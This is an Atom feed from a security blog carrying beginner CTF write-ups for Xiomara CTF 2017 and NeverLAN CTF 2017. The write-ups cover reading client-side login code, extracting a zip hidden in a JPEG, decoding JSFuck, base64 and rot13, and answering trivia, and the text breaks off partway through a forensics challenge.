<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RawSec</title>
  <subtitle>Security is everywhere</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://rawsec.ml/"/>
  <updated>2017-02-27T19:36:18.969Z</updated>
  <id>http://rawsec.ml/</id>
  
  <author>
    <name>Alexandre ZANNI</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Xiomara CTF 2017 - Write-ups</title>
    <link href="http://rawsec.ml/en/XiomaraCTF-2017-write-ups/"/>
    <id>http://rawsec.ml/en/XiomaraCTF-2017-write-ups/</id>
    <published>2017-02-26T23:00:00.000Z</published>
    <updated>2017-02-27T19:36:18.969Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : Xiomara CTF 2017</li>
<li><strong>Website</strong> : <a href="https://xiomara.xyz/" target="_blank" rel="external">xiomara.xyz</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/430/" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="50-easy-login-web-exploitation">50 - Easy Login? - Web Exploitation</h2>
<blockquote>
<p>An aspiring engineer started learning web development on Youtube a day ago and he was asked to build a nice, secure, simple login page as part of his project. Well, he just started off so don't blame him. Go, hack!</p>
<p><a href="http://139.59.61.220:23478/" target="_blank" rel="external">http://139.59.61.220:23478/</a></p>
</blockquote>
<p>The source is suspicious:</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"flag.css"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>= <span class="string">"center"</span>&gt;</span>Login Portal<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>Username :<span class="tag">&lt;<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span> =<span class="string">"username"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">       <span class="tag">&lt;<span class="name">b</span>&gt;</span> Password :<span class="tag">&lt;<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">"Login()"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"verify"</span> <span class="attr">name</span>=<span class="string">"button"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>Let's see <code>main.js</code>:</p>
<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Login</span>(<span class="params"></span>)</span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> username=<span class="built_in">document</span>.login.username.value;</div><div class="line">    <span class="keyword">var</span> password=<span class="built_in">document</span>.login.password.value;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (password == <span class="string">"53cure"</span> &amp;&amp; username==<span class="string">"@nokh@"</span>) &#123;</div><div class="line">        alert(<span class="string">"Awesome!"</span>);</div><div class="line">             <span class="built_in">window</span>.open(<span class="string">"secureflag.html"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"Oh swap!You are close. Why cant you try again?"</span>);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Now we can use <code>@nokh@</code> and <code>53cure</code> or directly go to <a href="http://139.59.61.220:23478/secureflag.html" target="_blank" rel="external">http://139.59.61.220:23478/secureflag.html</a>.</p>
<p>The image is named <code>hiddenflag.jpeg</code> so let's download it.</p>
<p>There is some hidden data here:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">$ binwalk hiddenflag.jpeg</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">48981         0xBF55          Zip archive data, at least v1.0 to extract, compressed size: 29, uncompressed size: 29, name: flag.txt</div><div class="line">49154         0xC002          End of Zip archive</div><div class="line"></div><div class="line">$ foremost -v hiddenflag.jpeg</div><div class="line">Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus</div><div class="line">Audit File</div><div class="line"></div><div class="line">Foremost started at Sun Feb 26 19:14:21 2017</div><div class="line">Invocation: foremost -v hiddenflag.jpeg</div><div class="line">Output directory: /home/noraj/CTF/XiomaraCTF/2017/output</div><div class="line">Configuration file: /etc/foremost.conf</div><div class="line">Processing: hiddenflag.jpeg</div><div class="line">|------------------------------------------------------------------</div><div class="line">File: hiddenflag.jpeg</div><div class="line">Start: Sun Feb 26 19:14:21 2017</div><div class="line">Length: 48 KB (49176 bytes)</div><div class="line"></div><div class="line">Num	 Name (bs=512)	       Size	 File Offset	 Comment</div><div class="line"></div><div class="line">0:	00000000.jpg 	      47 KB 	          0 	 </div><div class="line">foundat=flag.txtUT</div><div class="line">1:	00000095.zip 	      196 B 	      48981 	 </div><div class="line">*|</div><div class="line">Finish: Sun Feb 26 19:14:21 2017</div><div class="line"></div><div class="line">2 FILES EXTRACTED</div><div class="line"></div><div class="line">jpg:= 1</div><div class="line">zip:= 1</div><div class="line">------------------------------------------------------------------</div><div class="line"></div><div class="line">Foremost finished at Sun Feb 26 19:14:21 2017</div><div class="line"></div><div class="line">$ cd output/zip</div><div class="line"></div><div class="line">$ unzip 00000095.zip</div><div class="line">Archive:  00000095.zip</div><div class="line"> extracting: flag.txt</div><div class="line"></div><div class="line">$ cat flag.txt</div><div class="line">xiomara&#123;50_y0u_ar3_@_h@ck3r&#125;</div></pre></td></tr></table></figure></p>
<h2 id="50-lulz-web-exploitation">50 - Lulz - Web Exploitation</h2>
<blockquote>
<p>Heavy sarcasm awaits. Are you a person who finds opportunities even in trolls? Well, let's find out.</p>
<p><a href="http://139.59.61.220:23456" target="_blank" rel="external">http://139.59.61.220:23456</a></p>
</blockquote>
<p>The webpage is a troll opening a pop-up and redirecting to a troll page: <a href="http://139.59.61.220:23456/troll.html" target="_blank" rel="external">http://139.59.61.220:23456/troll.html</a></p>
<p>But of course you are using NoScript or know about <code>view-source:</code> in Firefox.</p>
<p>Let's see the source (<code>view-source:http://139.59.61.220:23456/</code>):</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hahaha!!!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">"lol.jpg"</span> <span class="attr">align</span> =<span class="string">"center"</span> <span class="attr">width</span> =<span class="string">"50%"</span> <span class="attr">height</span> = <span class="string">"50%"</span> <span class="attr">alt</span> =<span class="string">"lollol"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"hook.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>hook.js</code> source:</p>
<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">catch_me</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]]) <span class="comment">/*VERY LONG*/</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Redirect</span>(<span class="params"></span>) </span>&#123;</div><div class="line">               <span class="built_in">window</span>.location=<span class="string">"troll.html"</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            alert(<span class="string">"Warning you are about to be trolled"</span>);</div><div class="line">            setTimeout(<span class="string">'Redirect()'</span>, <span class="number">0</span>);</div></pre></td></tr></table></figure></p>
<p>The <code>catch_me()</code> function looks like some brainfuck-js.</p>
<p>Copy it and paste it in your browser terminal, you will get:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;alert(Xiomara&#123;i_4gr33_Y0U_4r3_a_Flash!&#125;))&quot;</div></pre></td></tr></table></figure></p>
<p>The is a <s>mistake</s> troll, so correct <code>Xiomara{i_4gr33_Y0U_4r3_a_Flash!}</code> into <code>xiomara{i_4gr33_Y0U_4r3_a_Flash!}</code> (lowercase the first char).</p>
<h2 id="50-no-flags-web-exploitation">50 - No Flags? - Web Exploitation</h2>
<blockquote>
<p>What would you do if we tell you there are no flags for this question? Go on, solve it. That reminds me, Nothing is impossible.</p>
<p><a href="http://139.59.61.220:23467/" target="_blank" rel="external">http://139.59.61.220:23467/</a></p>
</blockquote>
<p>I tried <a href="http://139.59.61.220:23467/robots.txt" target="_blank" rel="external"><code>robots.txt</code></a>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">User-agent:*</div><div class="line">Disallow: /flags/</div><div class="line">Disallow: /more_flags/</div><div class="line">Disallow: /more_and_more_flags/</div><div class="line">Disallow: /no_flag/</div></pre></td></tr></table></figure></p>
<p><code>/flags/</code>, <code>/more_flags/</code> and <code>/more_and_more_flags/</code> are obviously trolls.</p>
<p>Let's see <code>/no_flag/</code> source:</p>
<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">function encode(str) &#123;</div><div class="line">str = str.replace(/http:/g, "^^^");</div><div class="line">str = str.replace(/bin/g, "*^$#!")</div><div class="line">str= str.replace(/com/g, "*%=_()");</div><div class="line">str= str.replace(/paste/g, "~~@;;");</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;iframe src="flag.txt" width="2500" height="2255"&gt;</div><div class="line">&lt;/iframe&gt;</div></pre></td></tr></table></figure></p>
<p>It's an iframe of <code>flag.txt</code> which containd some ASCII art, like the three others. But this time there is a script.</p>
<p>The ASCII art display <em>YOU HAVE BEEN HACKED !</em> but on the middle of <em>HACKED</em> we can see <code>&quot;^^^//~~@;;*^$#!.*%=_()/SwzEKazp&quot;</code>.</p>
<p>So let's replace back: <code>http://pastebin.com/SwzEKazp</code>.</p>
<p>So go to pastebin and... <code>This page has been removed!</code>.</p>
<p>So go to the <a href="https://web.archive.org/web/20170225133747/http://pastebin.com/SwzEKazp" target="_blank" rel="external">wayback machine</a>, there is a snapshot dating from 25 Feb. 2017.</p>
<p>We can see an untitled document from <em>XIOMARA_CTF</em> containing: <code>eGlvbWFyYXsxXzRtX21yX3IwYjA3fQ==</code>.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ printf %s &apos;eGlvbWFyYXsxXzRtX21yX3IwYjA3fQ==&apos; | base64 -di</div><div class="line">xiomara&#123;1_4m_mr_r0b07&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>NeverLAN CTF 2017 - Write-ups</title>
    <link href="http://rawsec.ml/en/NeverLAN-CTF-2017-write-ups/"/>
    <id>http://rawsec.ml/en/NeverLAN-CTF-2017-write-ups/</id>
    <published>2017-02-26T23:00:00.000Z</published>
    <updated>2017-02-27T22:29:30.548Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : NeverLAN CTF 2017</li>
<li><strong>Website</strong> : <a href="https://neverlanctf.com/" target="_blank" rel="external">neverlanctf.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/431/" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="50-encoding-apprentice-trivia">50 - Encoding Apprentice - Trivia</h2>
<blockquote>
<p>What common encoding practice’s title contains the square of 8 and occasionally ends with an “=”, or “==”?</p>
</blockquote>
<p>Answer: <em>base64</em></p>
<h2 id="50-shifty-ciphers-trivia">50 - Shifty Ciphers… - Trivia</h2>
<blockquote>
<p>What cipher is the shiftiest of them all? He even has his own salad…</p>
</blockquote>
<p>Answer: <em>caesar</em></p>
<h2 id="50-know-your-extensions-trivia">50 - Know your extensions - Trivia</h2>
<blockquote>
<p>Unix and Linux use this (instead of a file extension) to determine what format a file is.</p>
</blockquote>
<p>Answer: <em>magic numbers</em></p>
<h2 id="50-mmmm-ssl-trivia">50 - Mmmm... SSL - Trivia</h2>
<blockquote>
<p>What is the standard, secure, size of an ssl certificate?</p>
</blockquote>
<p>Answer: <em>2048</em></p>
<h2 id="50-don-t-eat-me-trivia">50 - Don't eat me - Trivia</h2>
<blockquote>
<p>I allow HTTP to act as a stateful protocol instead of the stateless protocol it actually is. Just a small piece of data sent from a website...</p>
</blockquote>
<p>Answer: <em>cookie</em></p>
<h2 id="50-neverlan-recon">50 - NeverLAN - Recon</h2>
<blockquote>
<p>We've been known to leak things on twitter...</p>
</blockquote>
<p>Go to NeverLanCTF twitter: <a href="https://twitter.com/NeverLanCTF" target="_blank" rel="external">https://twitter.com/NeverLanCTF</a></p>
<p>There is <a href="https://twitter.com/NeverLanCTF/status/834992893978804224" target="_blank" rel="external">an interesting twitter status</a>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Rnfl erpba vf rnfl. synt&#123;vas0ezngvba_vf_c0jre_xa0j_l0he_nqirefnel&#125; #CommonCaeserCipher</div></pre></td></tr></table></figure></p>
<p>I tried a rot13 and I got that:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Easy recon is easy. flag&#123;inf0rmation_is_p0wer_kn0w_y0ur_adversary&#125;</div></pre></td></tr></table></figure></p>
<p>Flag is <code>inf0rmation_is_p0wer_kn0w_y0ur_adversary</code>.</p>
<h2 id="100-purvesta-recon">100 - Purvesta - Recon</h2>
<blockquote>
<p>Purvesta also really likes his twitter...</p>
</blockquote>
<ul>
<li>NeverLAN CTFTime page: <a href="https://ctftime.org/team/32118" target="_blank" rel="external">https://ctftime.org/team/32118</a></li>
<li>purvesta CTFtime page: <a href="https://ctftime.org/user/23157" target="_blank" rel="external">https://ctftime.org/user/23157</a></li>
</ul>
<p>purvesta name is: <em>Tanner Purves</em>, his LinkedIn page is not working. So I searched for <em>twitter Tanner Purves</em> and found his twitter page <a href="https://twitter.com/purvesta0704" target="_blank" rel="external">@purvesta0704</a>.</p>
<p>His twitter descripton says:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\\\BSU &apos;20, Co-founder of the NeverLAN CTF/// &#123;ZmxhZ3tXMHdfeTB1X0FyM19HZXR0aW5nX2cwMGRfYXRfVGhpNX0=&#125;</div></pre></td></tr></table></figure></p>
<p>It looks like a base64 string:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ printf %s &apos;ZmxhZ3tXMHdfeTB1X0FyM19HZXR0aW5nX2cwMGRfYXRfVGhpNX0=&apos; | base64 -d</div><div class="line">flag&#123;W0w_y0u_Ar3_Getting_g00d_at_Thi5&#125;</div></pre></td></tr></table></figure></p>
<h2 id="50-soyoulikemusic-forensics">50 - SoYouLikeMusic - Forensics</h2>
<blockquote>
<p><a href="https://ctf.neverlanctf.com/files/d8dacada92f876cff3f4f5775185240c/SoYouLikeMusic.class" target="_blank" rel="external">SoYouLikeMusic.class</a></p>
</blockquote>
<p>We can use <code>strings</code> on the java class:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">$ strings SoYouLikeMusic.class</div><div class="line">scan</div><div class="line">Ljava/util/Scanner;</div><div class="line">&lt;init&gt;</div><div class="line">Code</div><div class="line">LineNumberTable</div><div class="line">main</div><div class="line">([Ljava/lang/String;)V</div><div class="line">decompilingTheCodeNow</div><div class="line">qOne</div><div class="line">StackMapTable</div><div class="line">qTwo</div><div class="line">qThree</div><div class="line">playGame</div><div class="line">SourceFile</div><div class="line">SoYouLikeMusic.java</div><div class="line">java/util/Scanner</div><div class="line">OAhh welcome... so I hear you like music? What might I call you fellow listener?</div><div class="line">java/lang/StringBuilder</div><div class="line">Well</div><div class="line">4, let&apos;s play a game and see how much you like music.</div><div class="line">UWho was the special artist to dj music for our live streams before the event started?</div><div class="line">    s7a73farm</div><div class="line">Try Again...</div><div class="line">@Now you are on a roll! What is zestyfe&apos;s favorite type of music?</div><div class="line">dubstep</div><div class="line">=Final Question! What is the name of purvesta&apos;s only rap song?</div><div class="line">The_Gettysburg_Address_Rap</div><div class="line">|I will ask you three questions. If you can answer them all right, then I will point you towards your precious flag you seek!</div><div class="line">Want to play? (y/n)</div><div class="line">;Great let&apos;s play! (ctrl-c if you really don&apos;t want to play)</div><div class="line">Congratulations!! You did it!!</div><div class="line">8ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=</div><div class="line">SoYouLikeMusic</div><div class="line">java/lang/Object</div><div class="line">java/lang/String</div><div class="line">java/lang/System</div><div class="line">Ljava/io/InputStream;</div><div class="line">(Ljava/io/InputStream;)V</div><div class="line">Ljava/io/PrintStream;</div><div class="line">java/io/PrintStream</div><div class="line">println</div><div class="line">(Ljava/lang/String;)V</div><div class="line">nextLine</div><div class="line">()Ljava/lang/String;</div><div class="line">trim</div><div class="line">append</div><div class="line">-(Ljava/lang/String;)Ljava/lang/StringBuilder;</div><div class="line">toString</div><div class="line">equals</div><div class="line">(Ljava/lang/Object;)Z</div><div class="line">equalsIgnoreCase</div><div class="line">(Ljava/lang/String;)Z</div><div class="line">exit</div><div class="line">(I)V</div></pre></td></tr></table></figure></p>
<p>Focus on:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Congratulations!! You did it!!</div><div class="line">8ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=</div></pre></td></tr></table></figure></p>
<p>That looks like base64:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">printf %s &apos;8ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=&apos; |base64 -d</div><div class="line">񙱅��Mѥ��&#125;]��ѥ��&#125;=�&#125;���ٕ�ф��&#125;5��х���base64: invalid input</div></pre></td></tr></table></figure></p>
<p>That's wrong let's execute the java class, we know teh answers:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$ java -cp . SoYouLikeMusic</div><div class="line">Ahh welcome... so I hear you like music? What might I call you fellow listener?</div><div class="line">alex</div><div class="line"></div><div class="line">Well alex, let&apos;s play a game and see how much you like music.</div><div class="line">I will ask you three questions. If you can answer them all right, then I will point you towards your precious flag you seek!</div><div class="line">Want to play? (y/n)</div><div class="line">y</div><div class="line"></div><div class="line">Great let&apos;s play! (ctrl-c if you really don&apos;t want to play)</div><div class="line"></div><div class="line">Who was the special artist to dj music for our live streams before the event started?</div><div class="line">s7a73farm</div><div class="line"></div><div class="line">Now you are on a roll! What is zestyfe&apos;s favorite type of music?</div><div class="line">dubstep</div><div class="line"></div><div class="line">Final Question! What is the name of purvesta&apos;s only rap song?</div><div class="line">The_Gettysburg_Address_Rap</div><div class="line"></div><div class="line">Congratulations!! You did it!!</div><div class="line">ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=</div></pre></td></tr></table></figure></p>
<p>There was only a <code>8</code> before our base64 string:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ printf %s &apos;ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=&apos; | base64 -di</div><div class="line">flag&#123;Still_Waiting_On_purvesta&apos;s_Mixtape&#125;</div></pre></td></tr></table></figure></p>
<p><strong>Note</strong>: This is not forensics.</p>
<h2 id="300-just-a-selfie-forensics">300 - just-a-selfie - Forensics</h2>
<blockquote>
<p>You've been put in charge of a very secret project. There's talk that some of your data has leaked out. Your security analyst has flagged this email as &quot;out of place&quot;. Has your company been breached?</p>
<p>Hmm.. Binwalk.</p>
<p>Now that's a useful tool!</p>
</blockquote>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file email.txt</div><div class="line">email.txt: SMTP mail, ASCII text</div></pre></td></tr></table></figure></p>
<p>This is a mail with a attached image.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">--Apple-Mail=_9C94B8C8-A2CF-4892-8E1B-A89A4C3EAE03</div><div class="line">Content-Transfer-Encoding: base64</div><div class="line">Content-Disposition: inline;</div><div class="line">    filename=selfie.jpg</div><div class="line">Content-Type: image/jpeg;</div><div class="line">    x-unix-mode=0644;</div><div class="line">    name=&quot;selfie.jpg&quot;</div><div class="line">Content-Id: &lt;456C033A-8B84-4975-B1DC-3E5820C8993A@death.star&gt;</div></pre></td></tr></table></figure></p>
<p>The image is base64 encoded, and split between line 92 and line 12617.</p>
<p>Of course, <code>binwalk</code> is useless here:</p>
